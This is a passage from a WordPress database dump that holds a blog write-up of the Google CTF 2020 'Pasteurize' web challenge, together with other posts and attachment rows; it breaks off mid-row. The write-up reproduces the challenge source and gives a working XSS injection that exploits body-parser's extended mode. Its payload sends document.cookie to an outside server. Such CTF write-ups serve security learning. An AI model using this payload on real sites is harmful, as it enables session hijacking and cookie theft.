class=\"wp-image-1151\"/></figure></div>\n<!-- /wp:image -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>We also have the option to share this with TJMike&#x1f3a4;. </p>\n<p>There\'s a JavaScript that says sharing with TJMike and after a timeout it goes away.</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:image {\"align\":\"center\",\"id\":1152,\"sizeSlug\":\"large\"} -->\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/08/3.png\" alt=\"\" class=\"wp-image-1152\"/></figure></div>\n<!-- /wp:image -->\n\n<!-- wp:group -->\n<div class=\"wp-block-group\"><div class=\"wp-block-group__inner-container\"><!-- wp:tadv/classic-paragraph -->\n<h2>Clues</h2>\n<p>Looking at the HTML source of this page, looks like the \"Paste\" note is populated inside &lt;script&gt; tags from the server side, then the note is passed to <em>DOMPurify.sanitize</em> library and then displayed on the page using \"innerHTML\".</p>\n<!-- /wp:tadv/classic-paragraph --></div></div>\n<!-- /wp:group -->\n\n<!-- wp:image {\"align\":\"center\",\"id\":1157,\"sizeSlug\":\"large\"} -->\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/08/7.png\" alt=\"\" class=\"wp-image-1157\"/></figure></div>\n<!-- /wp:image -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>There\'s also a note which says: \"<span style=\"color: #339966;\">&lt;!-- TODO: Fix b/1337 in /source that could lead to XSS --&gt;</span>\". So we navigate to <a href=\"https://pasteurize.web.ctfcompetition.com/source\">https://pasteurize.web.ctfcompetition.com/source</a>. Here, we can see what looks like the source code of this page written in Node.js. </p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"js\",\"theme\":\"enlighter\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-theme=\"enlighter\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">const express = require(\'express\');\nconst bodyParser = require(\'body-parser\');\nconst utils = require(\'./utils\');\nconst Recaptcha = require(\'express-recaptcha\').RecaptchaV3;\nconst uuidv4 = require(\'uuid\').v4;\nconst Datastore = require(\'@google-cloud/datastore\').Datastore;\n\n/* Just reCAPTCHA stuff. */\nconst CAPTCHA_SITE_KEY = process.env.CAPTCHA_SITE_KEY || \'site-key\';\nconst CAPTCHA_SECRET_KEY = process.env.CAPTCHA_SECRET_KEY || \'secret-key\';\nconsole.log(\"Captcha(%s, %s)\", CAPTCHA_SECRET_KEY, CAPTCHA_SITE_KEY);\nconst recaptcha = new Recaptcha(CAPTCHA_SITE_KEY, CAPTCHA_SECRET_KEY, {\n  \'hl\': \'en\',\n  callback: \'captcha_cb\'\n});\n\n/* Choo Choo! */\nconst app = express();\napp.set(\'view engine\', \'ejs\');\napp.set(\'strict routing\', true);\napp.use(utils.domains_mw);\napp.use(\'/static\', express.static(\'static\', {\n  etag: true,\n  maxAge: 300 * 1000,\n}));\n\n/* They say reCAPTCHA needs those. But does it? */\napp.use(bodyParser.urlencoded({\n  extended: true\n}));\n\n/* Just a datastore. I would be surprised if it\'s fragile. */\nclass Database {\n  constructor() {\n    this._db = new Datastore({\n      namespace: \'littlethings\'\n    });\n  }\n  add_note(note_id, content) {\n    const note = {\n      note_id: note_id,\n      owner: \'guest\',\n      content: content,\n      public: 1,\n      created: Date.now()\n    }\n    return this._db.save({\n      key: this._db.key([\'Note\', note_id]),\n      data: note,\n      excludeFromIndexes: [\'content\']\n    });\n  }\n  async get_note(note_id) {\n    const key = this._db.key([\'Note\', note_id]);\n    let note;\n    try {\n      note = await this._db.get(key);\n    } catch (e) {\n      console.error(e);\n      return null;\n    }\n    if (!note || note.length &lt; 1) {\n      return null;\n    }\n    note = note[0];\n    if (note === undefined || note.public !== 1) {\n      return null;\n    }\n    return note;\n  }\n}\n\nconst DB = new Database();\n\n/* Who wants a slice? */\nconst escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)\n  .replace(/&lt;/g, \'\\\\x3C\').replace(/>/g, \'\\\\x3E\');\n\n/* o/ */\napp.get(\'/\', (req, res) => {\n  res.render(\'index\');\n});\n\n/* \\o/ [x] */\napp.post(\'/\', async (req, res) => {\n  const note = req.body.content;\n  if (!note) {\n    return res.status(500).send(\"Nothing to add\");\n  }\n  if (note.length > 2000) {\n    res.status(500);\n    return res.send(\"The note is too big\");\n  }\n\n  const note_id = uuidv4();\n  try {\n    const result = await DB.add_note(note_id, note);\n    if (!result) {\n      res.status(500);\n      console.error(result);\n      return res.send(\"Something went wrong...\");\n    }\n  } catch (err) {\n    res.status(500);\n    console.error(err);\n    return res.send(\"Something went wrong...\");\n  }\n  await utils.sleep(500);\n  return res.redirect(`/${note_id}`);\n});\n\n/* Make sure to properly escape the note! */\napp.get(\'/:id([a-f0-9\\-]{36})\', recaptcha.middleware.render, utils.cache_mw, async (req, res) => {\n  const note_id = req.params.id;\n  const note = await DB.get_note(note_id);\n\n  if (note == null) {\n    return res.status(404).send(\"Paste not found or access has been denied.\");\n  }\n\n  const unsafe_content = note.content;\n  const safe_content = escape_string(unsafe_content);\n\n  res.render(\'note_public\', {\n    content: safe_content,\n    id: note_id,\n    captcha: res.recaptcha\n  });\n});\n\n/* Share your pastes with TJMike&#x1f3a4; */\napp.post(\'/report/:id([a-f0-9\\-]{36})\', recaptcha.middleware.verify, (req, res) => {\n  const id = req.params.id;\n\n  /* No robots please! */\n  if (req.recaptcha.error) {\n    console.error(req.recaptcha.error);\n    return res.redirect(`/${id}?msg=Something+wrong+with+Captcha+:(`);\n  }\n\n  /* Make TJMike visit the paste */\n  utils.visit(id, req);\n\n  res.redirect(`/${id}?msg=TJMike&#x1f3a4;+will+appreciate+your+paste+shortly.`);\n});\n\n/* This is my source I was telling you about! */\napp.get(\'/source\', (req, res) => {\n  res.set(\"Content-type\", \"text/plain; charset=utf-8\");\n  res.sendFile(__filename);\n});\n\n/* Let it begin! */\nconst PORT = process.env.PORT || 8080;\n\napp.listen(PORT, () => {\n  console.log(`App listening on port ${PORT}`);\n  console.log(\'Press Ctrl+C to quit.\');\n});\n\nmodule.exports = app;</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>There are several modules here, google-cloud datastore, recaptcha, The code that escapes &lt; and &gt; tags. I did go over each part, did some quick google search to understand the potential vulnerabilities in each of them, things like SQLi, exposed datastores, etc. Finally we can see the function which makes TJMike visit the paste.</p>\n<p>So based on my very limited CTF experience, in these types of challenges where some other user or the admin would visit your page, you can use the XSS to steal the cookie which either directly contains the flag or gives you access to their account and then you can read the flag. </p>\n<p>It looks like there is an XSS in the paste textbox. But before the note is displayed on the page, it is sanitized using DOMPurify library. So things like &lt;h1&gt; would go through but certain tags like &lt;script&gt; or attributes like onerror are removed.</p>\n<h2>How I went down the wrong rabbit hole</h2>\n<p>Here\'s where I got lost and spent a good amount of time on things that led nowhere. I learned new things but they were not necessarily helpful to solve this challenge. Feel free to skip to next section for the <a href=\"#final_solution\">final solution</a>.</p>\n<p>We usually only talk about how we succeed but I think there are lessons to be learned in failed attempts as well.</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>We started by searching for DOMPurify vulnerabilities &amp; bypasses and we got this URL: <a href=\"https://snyk.io/vuln/npm:dompurify\">https://snyk.io/vuln/npm:dompurify</a>. Turns out there is a category of XSS called Mutation XSS (mXSS) which occurs when the browser changes the structure of the HTML after it is checked and sanitized by another system. It specifically happens when innerHTML is used, which is the case in our scenario.</p>\n<p>There is a <a href=\"https://cure53.de/fp170.pdf\">CCS 2013 paper mXSS Attacks: Attacking well-structured Web-Applications by using innerHTML Mutations</a>. There are other blog posts discussing how mXSS could be used to bypass older version of DOMPurify, <a href=\"https://cure53.de/fp170.pdf\">this</a> and <a href=\"https://research.securitum.com/dompurify-bypass-using-mxss/\">this</a>. Unfortunately all these examples are fixed in the current version of DOMPurify.</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>The latest version of DOMPurify is 2.0.12, maybe this means something! I went back to the description of the challenge which said:  \"My source tells me that third parties might have implanted it with their little treats already.\"</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"js\",\"theme\":\"enlighter\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-theme=\"enlighter\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">/*! @license DOMPurify | (c) Cure53 and other contributors | Released under the Apache license 2.0 and Mozilla Public License 2.0 | github.com/cure53/DOMPurify/blob/2.0.8/LICENSE */</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>Moreover, the author of DOMPurify discussed in <a href=\"https://www.usenix.org/sites/default/files/conference/protected-files/enigma16_slides_heiderich.pdf\">a presentation</a> how us as a community are trusting him not to put backdoors in his library. </p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:jetpack/tiled-gallery {\"columnWidths\":[[24.278708014094146,25.622028310843746,21.87814033496684,28.22112334009526]],\"ids\":[1189,1184,1185,1186],\"linkTo\":\"media\"} -->\n<div class=\"wp-block-jetpack-tiled-gallery aligncenter is-style-rectangular\"><div class=\"tiled-gallery__gallery\"><div class=\"tiled-gallery__row\"><div class=\"tiled-gallery__col\" style=\"flex-basis:24.278708014094146%\"><figure class=\"tiled-gallery__item\"><a href=\"https://i2.wp.com/www.silverf0x00.com/wp-content/uploads/2020/08/11.png?ssl=1\"><img alt=\"\" data-height=\"503\" data-id=\"1189\" data-link=\"https://www.silverf0x00.com/?attachment_id=1189\" data-url=\"http://localhost:9095/WordPress/wp-content/uploads/2020/08/11.png\" data-width=\"819\" src=\"https://i2.wp.com/www.silverf0x00.com/wp-content/uploads/2020/08/11.png?ssl=1\" layout=\"responsive\"/></a></figure></div><div class=\"tiled-gallery__col\" style=\"flex-basis:25.622028310843746%\"><figure class=\"tiled-gallery__item\"><a href=\"https://i0.wp.com/www.silverf0x00.com/wp-content/uploads/2020/08/8.png?ssl=1\"><img alt=\"\" data-height=\"360\" data-id=\"1184\" data-link=\"https://www.silverf0x00.com/?attachment_id=1184\" data-url=\"http://localhost:9095/WordPress/wp-content/uploads/2020/08/8.png\" data-width=\"619\" src=\"https://i0.wp.com/www.silverf0x00.com/wp-content/uploads/2020/08/8.png?ssl=1\" layout=\"responsive\"/></a></figure></div><div class=\"tiled-gallery__col\" style=\"flex-basis:21.87814033496684%\"><figure class=\"tiled-gallery__item\"><a href=\"https://i1.wp.com/www.silverf0x00.com/wp-content/uploads/2020/08/9.png?ssl=1\"><img alt=\"\" data-height=\"417\" data-id=\"1185\" data-link=\"https://www.silverf0x00.com/?attachment_id=1185\" data-url=\"http://localhost:9095/WordPress/wp-content/uploads/2020/08/9.png\" data-width=\"611\" src=\"https://i1.wp.com/www.silverf0x00.com/wp-content/uploads/2020/08/9.png?ssl=1\" layout=\"responsive\"/></a></figure></div><div class=\"tiled-gallery__col\" style=\"flex-basis:28.22112334009526%\"><figure class=\"tiled-gallery__item\"><a href=\"https://i2.wp.com/www.silverf0x00.com/wp-content/uploads/2020/08/10.png?ssl=1\"><img alt=\"\" data-height=\"442\" data-id=\"1186\" data-link=\"https://www.silverf0x00.com/?attachment_id=1186\" data-url=\"http://localhost:9095/WordPress/wp-content/uploads/2020/08/10.png\" data-width=\"838\" src=\"https://i2.wp.com/www.silverf0x00.com/wp-content/uploads/2020/08/10.png?ssl=1\" layout=\"responsive\"/></a></figure></div></div></div></div>\n<!-- /wp:jetpack/tiled-gallery -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>Given the description and these slides and the fact that we are using the minified version of DOMPurify here, it is plausible to believe that DOMPurify is backdoored.</p>\n<p>So I tried diffing the version 2.0.8 from Github with the one on challenge website and they did not match. It took us a while to realize that the latest version (2.0.12) also uses the comment which says 2.0.8, and the library used here matches the correct version on Github and there are no backdoors. I don\'t know if it was on purpose or we were just not experienced enough and went off the wrong clues here, but at some point we realized that the easiest challenge in this CTF is not asking us to find zero days in public libraries. But it was fun, we learned about mXSS, read a CCS paper :) <a id=\"final_solution\"></a></p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:tadv/classic-paragraph -->\n<h2>Final solution</h2>\n<p>After closer inspection, we realize that DOMPurify is its latest version and there are no known bypasses for it. So we have to inject our XSS payload before it reaches DOMPurify. This means that we should inject double quotation, close the string definition in the JavaScript code on the page and run our JS payload.</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"js\",\"theme\":\"enlighter\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-theme=\"enlighter\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\"> &lt;script>\n        const note = \"a\";\n        const note_id = \"8e986166-f069-4bce-8ebd-4badf9b76477\";\n        const note_el = document.getElementById(\'note-content\');\n        const note_url_el = document.getElementById(\'note-title\');\n        const clean = DOMPurify.sanitize(note);\n        note_el.innerHTML = clean;\n        note_url_el.href = `/${note_id}`;\n        note_url_el.innerHTML = `${note_id}`;\n    &lt;/script></pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>The idea is to close the note definition (Yellow part is what we inject): <br /><em>const note = \"a<span style=\"background-color: #ffff00;\">\" ;[Inject JS code here]</span>;</em></p>\n<p>This is not trivial because double quotes and&lt;, &gt; are being encoded. Going back to the /source, we see that the bodyParser is enabled with extended: true.</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"js\",\"theme\":\"enlighter\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-theme=\"enlighter\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">/* They say reCAPTCHA needs those. But does it? */\napp.use(bodyParser.urlencoded({\n  extended: true\n}));</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>In general, when working with different parsers and serialization libraries, usually the Extended-like options are dangerous. In our case, it essentially allows us to send array-like objects as POST parameters [<a href=\"https://stackoverflow.com/a/55558468/1821461\">Read more...</a>].</p>\n<p>We can try this \"content[\"bar\"][\"content\"]=\"foobarbaz\" POST payload, which results to:</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:enlighter/codeblock {\"theme\":\"enlighter\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"enlighter\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">const note = \"\"\\\"bar\\\"\":{\"\\\"content\\\"\":\"\\\"foobarbaz\\\"\"}\";</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>Notice that already we have the quotations we need to close const note definition and inject our payload. We can confirm that alert works by POSTing this payload:</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"js\",\"theme\":\"enlighter\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-theme=\"enlighter\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">content[;alert(1)//][\"content\"]=\"foobarbaz\"</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>Finally, we can add an image to the page that sends the Cookies as the query string to our server:</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"js\",\"theme\":\"enlighter\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-theme=\"enlighter\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">content[;var i=new Image; i.src=\'https://silverf0x00.com/dump.php?c=\'.concat(document.cookie);//][\"content\"]=\"foobarbaz\"</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>So the JS code within the page looks like this:</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"js\",\"theme\":\"enlighter\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-theme=\"enlighter\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">       const note = \"\";var i=new Image; i.src=\'https://silverf0x00.com/dump.php?c=\'.concat(document.cookie);//\":{\"\\\"content\\\"\":\"\\\"foobarbaz\\\"\"}\";\n        const note_id = \"394a5c5f-f43c-4e9f-b73f-db36f9065191\";\n        const note_el = document.getElementById(\'note-content\');\n        const note_url_el = document.getElementById(\'note-title\');\n        const clean = DOMPurify.sanitize(note);\n        note_el.innerHTML = clean;\n        note_url_el.href = `/${note_id}`;\n        note_url_el.innerHTML = `${note_id}`;</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>And after asking TJMike to check out our paste, we get the flag in the cookie. <span style=\"background-color: #e0e0e0;\">CTF{Express_t0_Tr0ubl3s}</span></p>\n<p> </p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:image {\"align\":\"center\",\"id\":1147,\"sizeSlug\":\"large\"} -->\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/08/photo_2020-08-23_13-58-37-edited.jpg\" alt=\"\" class=\"wp-image-1147\"/></figure></div>\n<!-- /wp:image -->','Google CTF 2020 Pasteurize Web Challenge Write Up','','publish','open','open','','google-ctf-2020-pasteurize-web-challenge-write-up','','','2020-08-23 19:09:54','2020-08-24 00:09:54','',0,'https://www.silverf0x00.com/?p=1144',0,'post','',0),(1146,1,'2020-08-23 12:58:47','2020-08-23 17:58:47','','photo_2020-08-23_13-58-37','','inherit','open','closed','','photo_2020-08-23_13-58-37','','','2020-08-23 12:58:47','2020-08-23 17:58:47','',1144,'http://localhost:9095/WordPress/wp-content/uploads/2020/08/photo_2020-08-23_13-58-37.jpg',0,'attachment','image/jpeg',0),(1147,1,'2020-08-23 12:59:45','2020-08-23 17:59:45','','photo_2020-08-23_13-58-37','','inherit','open','closed','','photo_2020-08-23_13-58-37-2','','','2020-08-23 12:59:45','2020-08-23 17:59:45','',0,'http://localhost:9095/WordPress/wp-content/uploads/2020/08/photo_2020-08-23_13-58-37-edited.jpg',0,'attachment','image/jpeg',0),(1150,1,'2020-08-23 13:08:18','2020-08-23 18:08:18','','1','','inherit','open','closed','','1','','','2020-08-23 13:08:18','2020-08-23 18:08:18','',1144,'http://localhost:9095/WordPress/wp-content/uploads/2020/08/1.png',0,'attachment','image/png',0),(1151,1,'2020-08-23 13:08:54','2020-08-23 18:08:54','','2','','inherit','open','closed','','2','','','2020-08-23 13:08:54','2020-08-23 18:08:54','',1144,'http://localhost:9095/WordPress/wp-content/uploads/2020/08/2.png',0,'attachment','image/png',0),(1152,1,'2020-08-23 13:09:09','2020-08-23 18:09:09','','3','','inherit','open','closed','','3','','','2020-08-23 13:09:09','2020-08-23 18:09:09','',1144,'http://localhost:9095/WordPress/wp-content/uploads/2020/08/3.png',0,'attachment','image/png',0),(1155,1,'2020-08-23 13:10:42','2020-08-23 18:10:42','','5','','inherit','open','closed','','5','','','2020-08-23 13:10:42','2020-08-23 18:10:42','',1144,'http://localhost:9095/WordPress/wp-content/uploads/2020/08/5.png',0,'attachment','image/png',0),(1157,1,'2020-08-23 13:13:41','2020-08-23 18:13:41','','7','','inherit','open','closed','','7','','','2020-08-23 13:13:41','2020-08-23 18:13:41','',1144,'http://localhost:9095/WordPress/wp-content/uploads/2020/08/7.png',0,'attachment','image/png',0),(1184,1,'2020-08-23 18:44:55','2020-08-23 23:44:55','','8','','inherit','open','closed','','8','','','2020-08-23 18:44:55','2020-08-23 23:44:55','',1144,'http://localhost:9095/WordPress/wp-content/uploads/2020/08/8.png',0,'attachment','image/png',0),(1185,1,'2020-08-23 18:44:56','2020-08-23 23:44:56','','9','','inherit','open','closed','','9','','','2020-08-23 18:44:56','2020-08-23 23:44:56','',1144,'http://localhost:9095/WordPress/wp-content/uploads/2020/08/9.png',0,'attachment','image/png',0),(1186,1,'2020-08-23 18:44:57','2020-08-23 23:44:57','','10','','inherit','open','closed','','10','','','2020-08-23 18:44:57','2020-08-23 23:44:57','',1144,'http://localhost:9095/WordPress/wp-content/uploads/2020/08/10.png',0,'attachment','image/png',0),(1189,1,'2020-08-23 18:45:47','2020-08-23 23:45:47','','11','','inherit','open','closed','','11','','','2020-08-23 18:45:47','2020-08-23 23:45:47','',1144,'http://localhost:9095/WordPress/wp-content/uploads/2020/08/11.png',0,'attachment','image/png',0),(1208,1,'2020-09-28 12:15:38','2020-09-28 17:15:38','','headshot_new','','inherit','open','closed','','headshot_new','','','2020-09-28 12:15:38','2020-09-28 17:15:38','',0,'http://localhost:9095/WordPress/wp-content/uploads/2020/09/headshot_new.jpg',0,'attachment','image/jpeg',0),(1209,1,'2016-05-14 12:22:18','2016-05-14 12:22:18','Facing issues after 10.11.5 update? The login screen stuck at loading? Backups not available or are old? Don\'t panic hopefully this post will guide you through fixing it with no data loss. It took me 2 days to figure this out. The fun coincidence here is that the guy who posted this tip on apple forums said that it was his last resort before giving up. And when I found this post I was preparing my ElCapitan bootable disk to do a fresh installation.\n\n\"Never Give Up, Never Give In.\"<!--more-->\n<h1><strong>What didn\'t work for me</strong></h1>\nRecently I\'ve been making bad decisions with regards to backing up the systems before making changes. 10.11.5 update was downloaded and I thought I\'d do a backup before installing it. But since backups take long and updates don\'t \"usually\" fail I decided to do the backup after the update. It wasn\'t long before I found out the mistake I made to not to backup my data.\n\n10.11.5 update was installed and the machine (mbp 2015 13\") rebooted, everything went alright but a black screen with the cursor showed up  instead of the login screen.\n\n<img class=\"size-medium wp-image-19 aligncenter\" src=\"http://localhost:9095/WordPress/wp-content/uploads/2016/05/cursor-blackscreen-300x150.jpg\" alt=\"cursor-blackscreen\" width=\"300\" height=\"150\" />\n\nI waited for couple of minutes but this screen wasn\'t going away. I held the power button down to force turn off the device. After turning it on again the login screen showed up but after entering in the password it stuck at loading indefinitely.\n\nFirst things I tried was rebooting, and more rebooting, checking logs in single user mode (/var/log/system.log specifically), resetting NVRAM (Holding \"Command, Option, P, R\" on boot). None of them helped.\n\nI tried to add another user to my system to see if that will work. The process is as follows:\n<ol>\n 	<li><span class=\"comment-copy\">Enter single user mode (Hold Cmd+S while booting)2.</span></li>\n 	<li><span class=\"comment-copy\">Mount the drive using \"/sbin/mount -uw /\" command </span></li>\n 	<li><span class=\"comment-copy\">Remove \".AppleSetupDone\" file using \"rm /var/db/.AppleSetupDone\"</span></li>\n 	<li><span class=\"comment-copy\">Reboot</span></li>\n</ol>\nNow you\'ll be able to create another user, make sure you choose a different username than your existing one. I found out that I can successfully login with the newly created user so I manually backed up some of my important files.\n\nAfter failing so many times and not finding much information on the internet. Restoring old backups multiple times to experiment things yet failing I decided to do a fresh installation. So I went about making an ElCapitan bootable flash drive. (I found <a href=\"https://support.apple.com/en-us/HT201372\">this link</a> helpful) While waiting for this process to finish I decided to do some more research and I came across a way that actually fixed my issue.\n<h1><strong>What fixed the issue</strong></h1>\nUnder <a href=\"https://discussions.apple.com/thread/7376445\">this thread (Fix for ElCapitan Stuck at Login)</a> the OP had the same frustration as we had. To do this you\'d need to either have a user that logs in, be in single user mode or mount your drive on another device.\n\nThe Fix:\n<ol>\n 	<li>Run \"find /private/var/folders/ | grep com.apple.LaunchServices | grep csstore\" command and you\'ll get a list of files</li>\n 	<li>Rename these files to something like [filename].old</li>\n 	<li>Reboot</li>\n</ol>\nNow select your old user, it will take couple of minutes and you will successfully login.\n\nHopefully it will help you fix the issue without much headache.\n\nTell me about your experience in the comments section below.','Mac OS X ElCapitan 10.11.5 Update Login Issue','','publish','open','open','','os-x-10-11-5-login-issue','','','2016-05-14 12:22:18','2016-05-14 12:22:18','',0,'http://www.silverf0x00.com/?p=1',0,'post','',0),(1210,1,'2016-05-14 12:22:18','2016-05-14 12:22:18','This is an example page. It\'s different from a blog post because it will stay in one place and will show up in your site navigation (in most themes). Most people start with an About page that introduces them to potential site visitors. It might say something like this:\n\n<blockquote>Hi there! I\'m a bike messenger by day, aspiring actor by night, and this is my website. I live in Los Angeles, have a great dog named Jack, and I like pi&#241;a coladas. (And gettin\' caught in the rain.)</blockquote>\n\n...or something like this:\n\n<blockquote>The XYZ Doohickey Company was founded in 1971, and has been providing quality doohickeys to the public ever since. Located in Gotham City, XYZ employs over 2,000 people and does all kinds of awesome things for the Gotham community.</blockquote>\n\nAs a new WordPress user, you should go to <a href=\"http://www.silverf0x00.com/wp-admin/\">your dashboard</a> to delete this page and create new pages for your content. Have fun!','Sample Page','','publish','closed','open','','sample-page-2','','','2016-05-14 12:22:18','2016-05-14 12:22:18','',0,'http://www.silverf0x00.com/?page_id=2',0,'page','',0),(1211,1,'2016-0